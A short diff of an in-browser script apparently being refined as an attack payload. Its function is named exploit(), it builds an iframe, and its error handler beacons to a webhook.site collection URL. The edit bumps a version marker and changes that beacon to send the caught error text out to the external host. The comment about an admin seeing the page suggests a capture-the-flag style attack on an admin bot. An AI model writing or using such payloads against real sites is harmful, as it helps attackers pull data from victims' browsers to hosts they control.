@@ -1,5 +1,5 @@
 <script>
-console.log('v15');
+console.log('v16');
 
 function exploit() {
     var iframe = document.createElement('iframe');
@@ -24,7 +24,7 @@ function exploit() {
                 }
             }
         } catch(e) {
-            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?cors_blocked_but_admin_saw_page";
+            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?error=" + toString(e);
         }
     };
 
